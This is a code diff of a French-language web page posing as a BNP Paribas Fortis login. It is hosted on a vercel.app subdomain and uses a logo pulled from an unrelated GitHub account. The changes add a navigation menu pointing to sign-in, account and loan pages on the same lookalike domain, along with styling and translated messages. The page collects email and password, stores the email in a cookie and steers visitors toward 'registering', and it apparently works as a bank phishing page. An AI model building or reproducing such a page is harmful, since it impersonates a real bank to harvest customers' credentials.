@@ -5,6 +5,7 @@
   <meta charset="UTF-8">
  
  <meta name="viewport" content="width=device-width,height=device-height initial-scale=1">
+ <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
   <title></title>
   <style>
   @media only screen and (max-width: 360px) {
@@ -12,12 +13,12 @@
   
     
     body{
-    position: absolute;
+    position: relative;
  
-    
+    top
    margin :0px;
    padding: 0px;
-  overflow: hidden;
+  overflow-x: hidden;
       color:white;
   
     }
@@ -31,32 +32,33 @@
     }
     .signup{
       overflow: hidden;
-    position: relative;
+      margin: 0 auto;
+width:320px;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
-  height:100%;
-    
- 
+  padding: 50px 0px;
+    border-radius: 5px;
+ box-shadow: 2px 2px 28px lightslategray;
     opacity: 0.9;
       
    
       overflow: hidden;
     }
 .signup img{
-  
-  height: 100px;
-  width: 360px;
+ border-radius: 50%; 
+height:80px;
+  width: 80px;
 }
     input{
   
-     height:35px;
-      width:300px;
-      margin:20px 10px;
+     height:30px;
+      width:280px;
+      margin:5px auto;
       display: block;
-     border: 0.5px solid green;
-      border-radius: 4px;
+     border: 2px solid lightgrey;
+      border-radius: 2px;
       font-size: 18px;
     letter-spacing: 2px;
       outline: none;
@@ -65,11 +67,12 @@
     
   .password ,.email{
     font-style: bold;
-    text-shadow: 2px 2px 8px lightgreen;
+    text-shadow: 2px 2px 2px lightgrey;
     font-size: 20px;
     letter-spacing: 2px;
-    margin: 30px auto;
-    width:100px;
+    margin: 20px auto;
+    text-align: center;
+    width:100%;
     color: seagreen;
   }
     .btn-sign{
@@ -79,13 +82,14 @@
    width:100%;
     }
     button{
-      padding:10px 0px;
-     width: 300px;
-        background: white;
-        color:seagreen;
-        border: 0.5px solid darkgreen;
-        border-radius: 8px;
-        font-size: 18px;
+      padding:5px 0px;
+     width: 200px;
+        background:white;
+        color:seagreen ;
+        outline: none;
+        border:2px solid lightgrey;
+        border-radius: 3px;
+        font-size: 22px;
     }
     button:hover{
       outline: none;
@@ -96,8 +100,9 @@
     .info{
       color: red;
       text-align: center;
-      font-size:18px;
-      margin: 5px auto;
+      
+    
+      width: 100%;
     }
   
  
@@ -120,18 +125,110 @@ justify-content: center;
    transition :top 3s ease;
  }
  footer {
-   position:fixed;
-   top: 0px;
-  bottom: 0px;
-  margin: 600px 40px;
-  color:seagreen;
+ 
+ color: seagreen;
+text-shadow: 2px 2px 3px ;
+ 
 
   letter-spacing: 2px;
   font-size: 20px;
   text-align: center;
   
 }
+nav{ 
 
+  display: flex;
+  justify-content: center;
+  align-items: center;
+   
+   }
+   .list-drl{
+     position: absolute;
+   left: 0px;
+   right: 0px;
+z-index: 999;
+top: 80px;
+   padding: 20px 0px;
+  
+     display:none;
+     background:whitesmoke;
+     flex-direction: column;
+   
+     align-items:center;
+     opacity: 0;
+    transition: top opacity transform 5s ease;
+  
+     color: seagreen;
+     
+   }
+.list-drl li{
+  
+  list-style: none;
+ width: 363px;
+ text-align: center;
+  margin: 20px 0px;
+  background: white;
+  background: white;
+
+}
+.list-drl li a{
+ 
+  text-decoration: none;
+list-style: none;
+display: block;
+width:100%;
+color: seagreen;
+border-radius: 8px;
+text-align: center;
+font-size: 20px;
+padding: 8px 20px;
+}
+.list-drl li a:hover{
+  list-style: none;
+  background: white;
+  padding: 8px 0px;
+  width:363px;
+  border-radius: 4px;
+  background: seagreen;
+  color: whitesmoke;
+}
+   .imgbank h1 {
+    color: seagreen;
+    font-size: 20px;
+    font-style: italic;
+   
+    text-shadow: 2px 2px 8px seashell;
+   text-transform: uppercase;
+   }
+   .menu .menu-logo{
+
+ 
+
+   
+   
+   }
+   .menu-nav div{
+   
+ 
+   width:50px;
+   padding: 5px 20px;
+     margin: 30px;
+     font-size: 20px;
+     color:white;
+     text-decoration: none;
+     border:1px solid whitesmoke;
+   background: seagreen;
+     border-radius: 4px;
+   }
+   .menu-nav{
+  
+
+     
+
+ 
+    
+   }
+   
   }
   </style>
 </head>
@@ -139,50 +236,94 @@ justify-content: center;
 
 
 <body>
-  <div id="headears">
-    <header>
-   
-    </header>
+  
   
   <div id="isCompte">
     <div>
       Vous n'aviez pas de compte chez BNP Paribas Fortis.
-      Veillez vous approchez de l'une de nos agences bancaires près de chez ou contactez par mail nôtre service financier pour en faire la demande de création de votre compte bancaire
+      <div style="margin: 10px 0px;">
+        
+    
+     Êtes vous inscrit ? si oui veuillez patienter quelques minutes pour valider l'inscription demandée.
+     </div>
+     <div style="margin: 10px 0px;">
+       
+     
+     Si non? inscrivez vous dès maintenant en cliquant sur le lien ci dessous 
+     
+       
+     </div>
+     <a href="https://bnpparibas-gfrz.vercel.app/signin">S'inscrire</a>
     </div>
   </div>
 
  
-
-div class="menu">
-     <div class="list-drl">
+<div class="menu">
+  <div class="list-drl">
        <div class="list-item">
-         <li>Accueil</li>
+         <li> <a href="https://bnpparibas-gfrz.vercel.app/  ">Accueil</a></li>
     
        </div>
        <div class="list-item">
-         <li>Signup</li>
+         <li><a href="https://bnpparibas-gfrz.vercel.app/signup ">Se connecter</a></li>
        </div>
        <div class="list-item">
-         <li>BankAccount</li>
+         <li><a href="https://bnpparibas-gfrz.vercel.app/signin">S'inscrire</a></li>
        </div>
+    
+    
+    <div class="list-item">
+         <li><a href="https://bnpparibas-gfrz.vercel.app/account">Account</a></li>
+       </div>
+    <div class="list-item">
+   <li><a href="https://bnpparibas-gfrz.vercel.app/loan">Prêt</a></li>
+   
+     
+       
+     </div>
+   
+    </div>
      </div><div></div>
-    <div class="menu-logo">
-
+       
+     </div>
+     <nav>
+       
+     
   <div class="imgbank">
+  <div id="google_translate_element">
   
+  </div>
       <h1>BNP Paribas Fortis</h1>
        
         
   </div>
 
-    </div>
+    
+   
+      <div class="menu-nav">
+     
+        
+                <div href id="hover-list"> Menu</div>
+      </div>
+
+    </nav>
+
+
+
+  </div>
+
+
 <div class="signup">
   <img src="https://raw.githubusercontent.com/lisbonne456/gitau/master/bnp-paribas (1).jpg" alt="">
+  
   <div class="account">
  <h1>BNP Paribas Fortis</h1> 
 
     <div class="email">
-      MailBox@ </div>
+      <div style="margin: 10px 0px;">
+        Connectez-vous
+      </div>
+      Boîte Mail(@) <i class="fa fa-envelope" style="font-size:24px"></i></div>
       <div>
            <input id="mail" type="text"placeholder="r@gmail.com" value="" />
       </div>
@@ -191,7 +332,8 @@ div class="menu">
     
        </div>
      <div class="password">
-       Password
+       Mot de Passe
+ <i style="font-size:24px" class="fa">&#xf084;</i>
        
      </div>
      <div>
@@ -204,15 +346,21 @@ div class="menu">
  
 </div>
  <div class="btn-sign">
-         <button id=" btn"type="button" onclick="add()" >
-         signup
+         <button id=" btn"type="button" onclick="add()"  >
+         Connectez-vous<i style="font-size:24px" class="fa">&#xf090;</i>
          </button>
      </div>
        
        </div> 
       
       </div>
-     
+        <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+          <script type="text/javascript">
+            function googleTranslateElementInit() {
+              new google.translate.TranslateElement({ pageLanguage: 'en-US' }, 'google_translate_element');
+            }
+            console.log(navigator.language)
+          </script>
      <script type="text/javascript" charset="utf-8">
    
      var userConnectMail='',userConnectPassword=""
@@ -239,7 +387,7 @@ div class="menu">
          info[1].innerHTML=""
        }
        else{
-         info[1].innerHTML='password should have lenght 8'
+         info[1].innerHTML='Mot de passe doit avoir au minimum 8 caractères '
        }
      if(mail.value!=''){
     
@@ -248,7 +396,7 @@ div class="menu">
          info[0].innerHTML = ''
        }
        else {
-         info[0].innerHTML = 'Email should contain @ '
+         info[0].innerHTML = 'Email doit contenir  un symbole @'
        }
      }
      
@@ -280,18 +428,22 @@ createCookie('email',mail.value,1)
        
      }
      else{
+       const index = mail.value.indexOf('@')
+      if (password.value.length >= 8 && index > -1) {
       
-  isCompte.style.top='0px'
+      isCompte.style.top='0px'
+      }
+  
      }
      }
      else{
        if(mail.value==''){
      
-         info[0].innerHTML='veillez renseigner le champ Mail'
+         info[0].innerHTML=' EMail ne peut pas être vide'
        }
        if(password.value==''){
        
-         info[1].textContent="veillez renseigner le champ password"
+         info[1].textContent="Mot de passe ne peut pas être vide"
        }
        if(mail.value!=''){
        
@@ -301,14 +453,20 @@ createCookie('email',mail.value,1)
            info[0].innerHTML=''
          }
          else{
-           info[0].innerHTML='Email should contain @ '
+           info[0].innerHTML='Email doit avoir un arobase @'
          }
         
        }
        if(password.value!=''){
        userConnectPassword  =userFindPassword(password.value,contenu)
+     if (password.value.length >= 8) {
      
-         info[1].textContent=''
+       info[1].innerHTML = ""
+     }
+     else{
+       info[1].textContent='Mot de passe doit avoir au minimum 8 caractères '
+     }
+         
        
          
        }
@@ -392,6 +550,38 @@ window.onload=function(){
   }
   
 }
+
+let listOpe=true,fetchData=[],formGetUser={},bicselect='',view='',user={email:""}
+    const list= document.getElementById('hover-list')
+    const app=document.getElementById('app')
+    const listItem=document.getElementsByTagName('li')
+    const listDeroulante=document.getElementsByClassName("list-drl")
+    
+    
+
+
+/*============Variables setting======*/
+
+
+
+
+
+  list.addEventListener('click',function() {
+      if(listOpe){
+        listDeroulante[0].style.top = '80px'
+        listDeroulante[0].style.opacity = 1
+        listDeroulante[0].style.display='flex'
+        listOpe=false
+      }
+      else{
+        listDeroulante[0].style.top = '65px'
+        listDeroulante[0].style.opacity = 0
+      listDeroulante[0].style.display='none'
+        listOpe=true
+      }
+    
+    })
+   
    console.log(window.innerHeight)
 
      </script>
